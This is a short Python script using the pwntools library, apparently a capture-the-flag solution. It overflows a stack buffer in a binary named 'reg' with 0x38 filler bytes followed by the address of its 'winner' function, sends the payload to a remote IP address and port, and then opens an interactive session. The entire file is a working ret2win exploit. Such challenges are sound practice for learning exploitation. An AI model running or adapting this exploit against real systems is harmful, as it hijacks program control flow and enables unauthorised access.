from pwn import *

context.binary = exe = ELF('reg')

io = remote('209.97.140.29', 30506)

payload = b'i'*0x38 + p64(exe.sym['winner'])

io.sendlineafter(b' : ', payload)
io.interactive()